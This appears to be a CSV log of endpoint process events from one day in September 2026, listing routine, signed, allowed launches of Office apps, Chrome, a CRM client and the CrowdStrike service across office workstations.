event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00001,2026-09-07 06:19:50,WKST-MKT-010,ntinda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3792f4d2917474aa9d2cf92d59c6b647a437a78fe36af873044a14bec64be0d0,signed,ALLOWED,Low
P00002,2026-09-07 06:26:53,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c830e3cefd5025f996f6db00f7cd057ada85b62c44d569775c047adcb94c4371,signed,ALLOWED,Low
P00003,2026-09-07 06:29:43,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bdf6f7d8356d7ca5e768bb52746cd55d429a3279c077663523cce32eead17a93,signed,ALLOWED,Low
P00004,2026-09-07 06:35:28,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b82df4feab6e94cb5132189efa7a575817a6c9b9878e52ebd9e7060a7370eb48,signed,ALLOWED,Low
P00005,2026-09-07 06:37:36,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",80faaa0656aa17d7a0c14be3a97a0d9c0f51689b090756cfd76f37188ab3ca88,signed,ALLOWED,Low
P00006,2026-09-07 06:41:52,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",366a9ad091cefdfba41517178ada04952f5cda038694323e36bfbd8385cb1845,signed,ALLOWED,Low
P00007,2026-09-07 06:48:03,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",209ce3814bbd2b6c5e0b320102e7cd37836fe17d720d86e8faca555898c9e57d,signed,ALLOWED,Low
P00008,2026-09-07 06:48:44,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",804f48fd4ae5b76cd2dac58bae57c770a88434b14c8f80cd3183214362f988af,signed,ALLOWED,Low
P00009,2026-09-07 07:01:17,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c9f30b795ff0cf7baeeeb8713e4005f62d8bc13a50d443b3fd176fdd2d3bee09,signed,ALLOWED,Low
P00010,2026-09-07 07:04:29,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7044526bf2da23c5f1b677196a6fc80d18d0fd8a6417fcd0156f2f3cbb84eb80,signed,ALLOWED,Low
P00011,2026-09-07 07:12:57,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",54ab1f789f67b99180ba1718b499e51aaafd792ace04c3a65a4a9b94c5cfd14a,signed,ALLOWED,Low
P00012,2026-09-07 07:13:55,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",36945aebc083690e64dd183517d433eb3ed27ed4d8aa0cd128d8a342db229e64,signed,ALLOWED,Low
P00013,2026-09-07 07:27:53,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7cf130ede7d79d9e1203fade748aaccc32e0eb8c6165e068517a17d414ec22b2,signed,ALLOWED,Low
P00014,2026-09-07 07:33:29,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1a871aec1123f13db8f0ca46ca29b745c7d7eba48c17f1502d9121e8abace090,signed,ALLOWED,Low
P00015,2026-09-07 07:34:25,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",9a53401c22abe3d970e52e3a070613eb85668f5bcda7c9fdbc40a5c019c84741,signed,ALLOWED,Low
P00016,2026-09-07 07:37:46,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f1d56144ecfde33e374245306cdb7c68f972766efd10f792ef5f338ad9eb1aef,signed,ALLOWED,Low
P00017,2026-09-07 07:50:27,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",be3e283433c538769b56fef2919519d267caed44b35ca0571f06e80213394e81,signed,ALLOWED,Low
P00018,2026-09-07 08:13:10,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fa31e62bdefee262bc6debe688410a7f4f469aff2def491ccc7ffd3bd3560e7b,signed,ALLOWED,Low
P00019,2026-09-07 08:30:19,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a13c978b5f817bfa9b66f8d14f784addf0ab29ce3f1f5aded253fea279bc404c,signed,ALLOWED,Low
P00020,2026-09-07 08:38:25,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,9f0eb57cf13df1ce471fb9dd8a4037dbf21293473a0ae91678fd2960a9111c56,signed,ALLOWED,Low
P00021,2026-09-07 08:39:08,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e9d3ac3e31cb4703af189f056f2e2fe80df1fb7e2f73d24436f835b7054b84b6,signed,ALLOWED,Low
P00022,2026-09-07 08:39:46,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",91275abb7b805125484a199428324bc0bdedaca69497151a0578e3e81369c54d,signed,ALLOWED,Low
P00023,2026-09-07 08:44:50,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",601aac23b7a8dcceb55ce07b6f6756a55f0acd4927206aae1400fb5369e4658c,signed,ALLOWED,Low
P00024,2026-09-07 09:01:50,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5d2b72cef8690fc80a6dd4eb6fc3819f9ffca6e438285aa1c08b81244d7a672f,signed,ALLOWED,Low
P00025,2026-09-07 09:03:45,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",990cdaed7bcb282c54f15d372a75318fd9a4576890800a73df135becafde42e2,signed,ALLOWED,Low
P00026,2026-09-07 09:15:35,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",bd9e863dbbdbb97dd3c7a5e20b157135454fb3237242890d678c41c9b0fb275d,signed,ALLOWED,Low
P00027,2026-09-07 09:27:07,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",022cc132873158be4b7b77b5698c65c1518fb31044235ef29da477f00f199d4e,signed,ALLOWED,Low
P00028,2026-09-07 09:28:11,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",31140eecb6cab0780f2cdc343e164cdd8d919a01565849feb87e82998060bc98,signed,ALLOWED,Low
P00029,2026-09-07 09:31:32,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5f051df8ee2aafb04d93438af5d4a8430036dc2dc8828b56df60f6da5c27e776,signed,ALLOWED,Low
P00030,2026-09-07 09:41:38,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",35beeb3fbb70bba2bf36b3287c45203b173f56c67879da138bfa7158831f52af,signed,ALLOWED,Low
P00031,2026-09-07 09:42:03,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bfc651ed43b43a2ec5491076a430b28028cef8be5140e4b39ba5c30351a19768,signed,ALLOWED,Low
P00032,2026-09-07 09:50:13,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,49de21b9d54be390e350d89359ce1b78ea16490165235682db828a46457b0441,signed,ALLOWED,Low
P00033,2026-09-07 10:27:46,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14de82b2a9db665d228437ac3dc3771398dcebb09f35994302cad87c6c101b94,signed,ALLOWED,Low
P00034,2026-09-07 10:32:43,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,0b77b94a8ce48553a65c3bd8c864c6c4f05480195bb6068f11cdfb51fff79e26,signed,ALLOWED,Low
P00035,2026-09-07 10:45:17,WKST-LOAN-018,shilongo,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5a5c805befb61f8159675aebf66b5ecb35cffb142fa24e12d1924c98c7d8038b,signed,ALLOWED,Low
P00036,2026-09-07 10:57:24,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4ab67ad5464b86851878b8b8082c873dfdb11cee3fb803d26f47394f1b5fda43,signed,ALLOWED,Low
P00037,2026-09-07 11:08:33,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ed74463779123592b5b435a78f6476951227532fa3bbd939a2c0158ab33de6c6,signed,ALLOWED,Low
P00038,2026-09-07 11:12:16,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0efadc0fd21c404ef130cc8d8c29fb26adc61e481db7a126af00c391134fd761,signed,ALLOWED,Low
P00039,2026-09-07 11:25:54,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f897598246e0633f6a0d250988c34a94cacbfb6681e0dd9f734244008c80cac8,signed,ALLOWED,Low
P00040,2026-09-07 11:39:23,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ce07647e81888b9a171c0af7e8240c05d5afd59b6e451bec613341c837d4ac9d,signed,ALLOWED,Low
P00041,2026-09-07 11:46:41,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,19061e4a76b1a43f920f746aec5932a5f52c3e9d7cc160c51c085214c02f7790,signed,ALLOWED,Low
P00042,2026-09-07 11:56:05,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71890b43b4418d1ee9627a53c6a730ef795fb12007c4ba16237612ccc21152cd,signed,ALLOWED,Low
P00043,2026-09-07 11:59:44,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bd9e36342003caa341e2226fb23610f1ffe17815b02fdd03472a3cac83b1f63c,signed,ALLOWED,Low
P00044,2026-09-07 12:02:09,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7315ff7f443c32af911ec3042e0db3af04012f27d1ea5c924eefb3742bb98fa2,signed,ALLOWED,Low
P00045,2026-09-07 12:06:02,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e2ace1087cc7f9dc1c01f5a494ecccd0d7d671271d240b822cc8f2743ec51a24,signed,ALLOWED,Low
P00046,2026-09-07 12:11:03,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f29febcdc165817455fb58c6a0cdac70f025ba2027ed39a833492d41957d0f25,signed,ALLOWED,Low
P00047,2026-09-07 12:13:34,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3b249f47cacbb881cdc1f2921322ec0fed126d9a977af2b5fd138381b0954e8a,signed,ALLOWED,Low
P00048,2026-09-07 12:43:22,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6925789157d3767139214c4362366ab28139c54fa3f5250aecc357d95d7db52d,signed,ALLOWED,Low
P00049,2026-09-07 13:04:30,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cb12cb6b80e3c1c0025eed27020df2f4cfe93c6b563a11dbf7aa387a5b49a5bf,signed,ALLOWED,Low
P00050,2026-09-07 13:25:02,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8c103cbcea0e6f25489e42acb0ed302e6c2d68ea844a7b890f5ca3f3cefd5403,signed,ALLOWED,Low
P00051,2026-09-07 13:42:07,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c3226d4c962f8f55b0e566cf9f44e0268508b2d1ee425151034add42649df930,signed,ALLOWED,Low
P00052,2026-09-07 13:51:18,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",252e3db05a679a12c5d266ec14f9fc270d73f295ae926a386b67f9fc365639bb,signed,ALLOWED,Low
P00053,2026-09-07 14:11:18,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",099a028dd5fb17cef7ad65d5794f968d5a90f72c507f2f996e51f272d5ec4562,signed,ALLOWED,Low
P00054,2026-09-07 14:13:12,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5335ca37d6d7640d6e902ca7f19c2b156bbe4764b095c5bff533f11d50f3e5d6,signed,ALLOWED,Low
P00055,2026-09-07 14:30:32,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8c1455501a1fa7d59fb9cbfec553f70b2aaaff4af2ed5b402c2852187f0ecd85,signed,ALLOWED,Low
P00056,2026-09-07 14:35:50,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2eb6ee7ce7eb968d6d0199723374fddad2ab69f4f240100da7518e9b08c290fa,signed,ALLOWED,Low
P00057,2026-09-07 14:38:05,WKST-FIN-004,tshivute,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",306326112c5d9e4280aab22a00c19a3e54963c859ffd0aa8e65ce3c029993e54,signed,ALLOWED,Low
